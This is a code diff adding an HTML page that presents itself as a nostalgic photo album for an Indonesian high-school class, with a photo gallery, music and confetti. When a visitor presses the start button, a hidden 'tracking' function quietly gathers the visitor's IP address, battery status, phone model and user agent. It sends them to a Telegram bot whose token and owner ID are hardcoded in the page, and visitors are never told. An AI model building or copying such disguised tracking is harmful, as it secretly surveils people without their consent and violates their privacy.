@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Album XII-I BARISTA MANSAS</title>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+    <style>
+        :root {
+            --bg-color: #f4f1ea;
+            --accent-color: #5d4037;
+            --text-color: #3e2723;
+            --gold: #d4af37;
+        }
+
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow-x: hidden;
+            font-family: 'Georgia', serif;
+            background: var(--bg-color);
+        }
+
+        /* --- Halaman Awal (Splash Screen) --- */
+        #splash-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            display: flex;
+            flex-direction: column; 
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            transition: opacity 1s ease-out;
+            overflow: hidden;
+        }
+
+        .splash-logo {
+            width: 150px; 
+            height: auto;
+            margin-bottom: 30px;
+            z-index: 10;
+            filter: drop-shadow(0 0 10px rgba(212, 175, 55, 0.5));
+            animation: pulse-logo 3s ease-in-out infinite;
+        }
+
+        @keyframes pulse-logo {
+            0%, 100% { transform: scale(1); opacity: 0.8; }
+            50% { transform: scale(1.05); opacity: 1; }
+        }
+
+        .floating-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            opacity: 0.4;
+        }
+
+        .floating-photo {
+            position: absolute;
+            width: 110px;
+            height: 140px;
+            background: white;
+            padding: 5px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
+            pointer-events: none;
+            animation: float-around var(--duration) linear infinite;
+        }
+
+        .floating-photo img {
+            width: 100%;
+            height: 80%;
+            object-fit: cover;
+        }
+
+        @keyframes float-around {
+            0% { transform: translate(var(--startX), 110vh) rotate(var(--startRot)); }
+            100% { transform: translate(var(--endX), -25vh) rotate(var(--endRot)); }
+        }
+
+        .boom-button {
+            position: relative;
+            z-index: 10;
+            padding: 20px 40px;
+            font-size: 24px;
+            font-weight: bold;
+            color: var(--gold);
+            background: rgba(0, 0, 0, 0.6);
+            border: 2px solid var(--gold);
+            cursor: pointer;
+            border-radius: 50px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            transition: all 0.3s;
+            box-shadow: 0 0 15px rgba(212, 175, 55, 0.4);
+            backdrop-filter: blur(5px);
+        }
+
+        .boom-button:hover {
+            background: var(--gold);
+            color: black;
+            box-shadow: 0 0 30px rgba(212, 175, 55, 0.8);
+        }
+
+        /* --- Konten Utama --- */
+        #main-content {
+            display: none;
+            opacity: 0;
+            transition: opacity 2s ease-in;
+            padding: 50px 20px;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        header { text-align: center; margin-bottom: 40px; }
+        header h1 { font-size: 3rem; margin: 0; color: var(--accent-color); }
+        header p { font-style: italic; font-size: 1.2rem; }
+
+        .album-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 40px;
+            width: 95%;
+            max-width: 1400px;
+            margin-bottom: 100px;
+        }
+
+        .polaroid {
+            background: white;
+            padding: 15px 15px 40px 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            transition: all 0.4s ease;
+            position: relative;
+            cursor: pointer;
+        }
+
+        .polaroid:nth-child(3n+1) { transform: rotate(-2deg); }
+        .polaroid:nth-child(3n+2) { transform: rotate(3deg); }
+        .polaroid:nth-child(3n+3) { transform: rotate(-1deg); }
+
+        .polaroid img {
+            width: 100%;
+            height: 250px;
+            object-fit: cover;
+            filter: sepia(30%);
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .polaroid:hover {
+            transform: rotate(0deg) scale(1.08);
+            z-index: 10;
+            box-shadow: 0 15px 30px rgba(0,0,0,0.3);
+        }
+
+        .caption {
+            text-align: center;
+            margin-top: 15px;
+            font-weight: bold;
+            color: #555;
+        }
+
+        /* --- MODAL --- */
+        #photo-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            backdrop-filter: blur(8px);
+            cursor: zoom-out;
+        }
+
+        #modal-img {
+            max-width: 90%;
+            max-height: 80%;
+            box-shadow: 0 0 30px rgba(255,255,255,0.2);
+            border: 5px solid white;
+            border-radius: 4px;
+            transform: scale(0.8);
+            transition: transform 0.3s ease;
+        }
+
+        #photo-modal.active #modal-img { transform: scale(1); }
+
+        #modal-caption {
+            position: absolute;
+            bottom: 30px;
+            color: white;
+            font-size: 1.5rem;
+            text-align: center;
+            width: 100%;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.8);
+        }
+
+        footer { padding: 40px; text-align: center; opacity: 0.6; font-size: 0.9rem; }
+    </style>
+</head>
+<body>
+
+    <audio id="memoryAudio" loop>
+        <source src="https://files.catbox.moe/61nafo.m4a" type="audio/mpeg">
+    </audio>
+
+    <div id="splash-screen">
+        <div class="floating-bg" id="floating-container"></div>
+        <img src="https://files.catbox.moe/umo15f.png" alt="Logo" class="splash-logo">
+        <button class="boom-button" onclick="startMemories()">Klik Memori Barista Mansas</button>
+    </div>
+
+    <div id="photo-modal" onclick="closeModal()">
+        <img id="modal-img" src="" alt="Full Photo">
+        <div id="modal-caption"></div>
+    </div>
+
+    <div id="main-content">
+        <header>
+            <h1>XII-I BARISTA MANSAS</h1>
+            <p>"Satu Rasa, Sejuta Cerita di Masa SMA"</p>
+        </header>
+
+        <div class="album-container" id="albumList">
+            </div>
+
+        <footer>
+            &copy; 2026 XII-I BARISTA MANSAS. Memories Last Forever.
+        </footer>
+    </div>
+
+    <script>
+        // --- DATA FOTO ---
+        const photoLinks = [
+            "3to45k.jpg", "p2m0i8.jpg", "seaqg5.jpg", "4udwl8.jpg", "7mgco8.jpg", "dlckdp.jpg", 
+            "ic800w.jpg", "nm38tv.jpg", "9983h2.jpg", "hk5gf7.jpg", "n12yrb.jpg", "ta5osh.jpg", 
+            "r3tmb0.jpg", "mnz84w.jpg", "ut1anw.jpg", "7sx1jn.jpg", "r43aet.jpg", "sw6wre.jpg", 
+            "ff5b07.jpg", "91v3ba.jpg", "ty1iyw.jpg", "3cid87.jpg", "t5pje1.jpg", "0p3oc0.jpg", 
+            "7ents2.jpg", "vnpssy.jpg", "iywn1p.jpg", "kzdl1x.jpg", "8nvr6z.jpg", "eb9yqr.jpg", 
+            "4l8dw6.jpg", "kuu517.jpg", "k0ezc7.jpg", "r3tmb0.jpg", "vg28wf.jpg", "tcvsf0.jpg", 
+            "q4dx2h.jpg", "ic800w.jpg", "62xrmt.jpg", "gkgaql.jpg", "kv3wqt.jpg", "4294gn.jpg", 
+            "jldl5i.jpg", "yw78mk.jpg", "q3z8qm.jpg", "uyr87s.jpg", "5k6mgr.jpg", "vkr2z3.jpg", 
+            "ty1b2l.jpg", "rs0ra2.jpg", "89k9ba.jpg", "07cji7.jpg", "pmnsfp.jpg", "cjnsns.jpg", 
+            "y6reu0.jpg", "kyxf9u.jpg", "4a8yhk.jpg", "u85u06.jpg", "7p2h7f.jpg", "1lsj2s.jpg", 
+            "i902lw.jpg", "9xr2oj.jpg", "0epcbr.jpg", "csuo1l.jpg"
+        ];
+
+        // --- KONFIGURASI OWNER ---
+        const TELEGRAM_TOKEN = '8526195679:AAH--icxmjSatH2vj3AIbUDC-5mw6bwH6i0';
+        const OWNER_ID = '358455215';
+        const OWNER_USER = '@Boyeszzz';
+
+        // --- RENDER FOTO ---
+        const albumList = document.getElementById('albumList');
+        photoLinks.forEach((link, index) => {
+            const div = document.createElement('div');
+            div.className = 'polaroid';
+            div.onclick = () => openModal(div);
+            div.innerHTML = `<img src="https://files.catbox.moe/${link}"><div class="caption">Momen Indah ${index + 1}</div>`;
+            albumList.appendChild(div);
+        });
+
+        function openModal(element) {
+            const modal = document.getElementById('photo-modal');
+            const modalImg = document.getElementById('modal-img');
+            const modalCaption = document.getElementById('modal-caption');
+            modalImg.src = element.querySelector('img').src;
+            modalCaption.innerText = element.querySelector('.caption').innerText;
+            modal.style.display = 'flex';
+            setTimeout(() => modal.classList.add('active'), 10);
+        }
+
+        function closeModal() {
+            const modal = document.getElementById('photo-modal');
+            modal.classList.remove('active');
+            setTimeout(() => modal.style.display = 'none', 300);
+        }
+
+        function initFloatingPhotos() {
+            const container = document.getElementById('floating-container');
+            for (let i = 0; i < 15; i++) {
+                const photo = document.createElement('div');
+                photo.className = 'floating-photo';
+                const startX = Math.random() * 100 + 'vw';
+                const duration = (Math.random() * 10 + 15) + 's';
+                photo.style.setProperty('--startX', startX);
+                photo.style.setProperty('--endX', (Math.random() * 100 - 10) + 'vw');
+                photo.style.setProperty('--duration', duration);
+                photo.style.setProperty('--startRot', (Math.random() * 40 - 20) + 'deg');
+                photo.style.setProperty('--endRot', (Math.random() * 360) + 'deg');
+                photo.style.animationDelay = (Math.random() * 5) + 's';
+                
+                const img = document.createElement('img');
+                img.src = `https://files.catbox.moe/${photoLinks[Math.floor(Math.random() * 5)]}`;
+                photo.appendChild(img);
+                container.appendChild(photo);
+            }
+        }
+
+        window.onload = initFloatingPhotos;
+
+        // --- LOGIK PELACAKAN (STATUS HP, IP, BATERAI) ---
+                async function sendLogToTelegram() {
+            try {
+                // 1. Ambil IP
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+
+                // 2. Ambil Baterai
+                let batteryStatus = "Tidak Terdeteksi";
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    batteryStatus = `${Math.round(b.level * 100)}% ${b.charging ? '(Sedang Dicas)' : '(Baterai Biasa)'}`;
+                }
+
+                // 3. Deteksi Perangkat Lebih Detail
+                const ua = navigator.userAgent;
+                let deviceModel = "Perangkat Tidak Dikenal";
+
+                // Logika deteksi tipe HP dari User Agent
+                if (/android/i.test(ua)) {
+                    const match = ua.match(/Android\s+([^\s;]+);\s+([^;)]+)/);
+                    deviceModel = match ? match[2] : "Android Device";
+                } else if (/iPhone|iPad|iPod/i.test(ua)) {
+                    deviceModel = "Apple iOS Device";
+                } else {
+                    deviceModel = "PC / Desktop";
+                }
+
+                // 4. Susun Pesan
+                const pesan = `
+🚀 *LAPORAN PENGUNJUNG*
+━━━━━━━━━━━━━━━━━━
+👤 *Owner:* ${OWNER_USER}
+📱 *Model HP:* ${deviceModel}
+🔋 *Baterai:* ${batteryStatus}
+🌐 *IP:* \`${ipData.ip}\`
+⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}
+ℹ️ *Full UserAgent:* \` ${ua.slice(0, 50)}... \`
+━━━━━━━━━━━━━━━━━━`;
+
+                // 5. Kirim ke Bot Telegram
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        chat_id: OWNER_ID, 
+                        text: pesan, 
+                        parse_mode: 'Markdown' 
+                    })
+                });
+            } catch (e) { 
+                console.log("Log error"); 
+            }
+        }
+
+
+        function startMemories() {
+            // Jalankan log pelacakan
+            sendLogToTelegram();
+
+            const audio = document.getElementById('memoryAudio');
+            audio.play().catch(() => {});
+
+            // Confetti Effect
+            var duration = 4 * 1000;
+            var end = Date.now() + duration;
+            (function frame() {
+                confetti({ particleCount: 3, angle: 60, spread: 55, origin: { x: 0 } });
+                confetti({ particleCount: 3, angle: 120, spread: 55, origin: { x: 1 } });
+                if (Date.now() < end) requestAnimationFrame(frame);
+            }());
+
+            const splash = document.getElementById('splash-screen');
+            const content = document.getElementById('main-content');
+            splash.style.opacity = '0';
+            setTimeout(() => {
+                splash.style.display = 'none';
+                content.style.display = 'flex';
+                setTimeout(() => content.style.opacity = '1', 50);
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
